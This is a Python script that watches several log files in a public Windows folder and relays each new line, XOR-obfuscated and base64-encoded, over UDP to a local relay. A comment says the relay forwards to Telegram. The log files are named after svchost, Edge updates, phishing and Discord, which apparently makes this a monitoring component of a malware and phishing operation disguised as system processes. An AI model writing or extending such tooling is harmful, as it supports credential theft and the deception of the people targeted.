import socket
import base64
import sys
import os
import time
import datetime
import threading

def log_to_tg(msg, port=51337):
    try:
        salt = b"n2xkNQYbZwj8r9fz"
        data = msg.encode('utf-8')
        xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
        payload = base64.b64encode(xor_data).decode('utf-8')
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload.encode('utf-8'), ("127.0.0.1", port))
    except: pass

def monitor_file(path, label):
    if not os.path.exists(path):
        with open(path, "w") as f: f.write("")
    
    with open(path, "r") as f:
        f.seek(0, 2)
        while True:
            line = f.readline()
            if not line:
                time.sleep(1)
                continue
            txt = line.strip()
            print(f"[{label}] {txt}")
            log_to_tg(f"📝 <b>[{label}]</b> <code>{txt}</code>")

def main():
    # Monitors multiple project log files and forwards them to Telegram
    logs = [
        ("C:\\Users\\Public\\svchost_debug.log", "CORE"),
        ("C:\\Users\\Public\\edge_update_debug.log", "HANDLER"),
        ("C:\\Users\\Public\\phish_debug.log", "PHISH"),
        ("C:\\Users\\Public\\discord_debug.log", "DISCORD")
    ]
    
    log_to_tg("🚀 <b>Global Logger Started</b>. Monitoring project events...")
    
    threads = []
    for path, label in logs:
        t = threading.Thread(target=monitor_file, args=(path, label), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads: t.join()

if __name__ == "__main__":
    main()
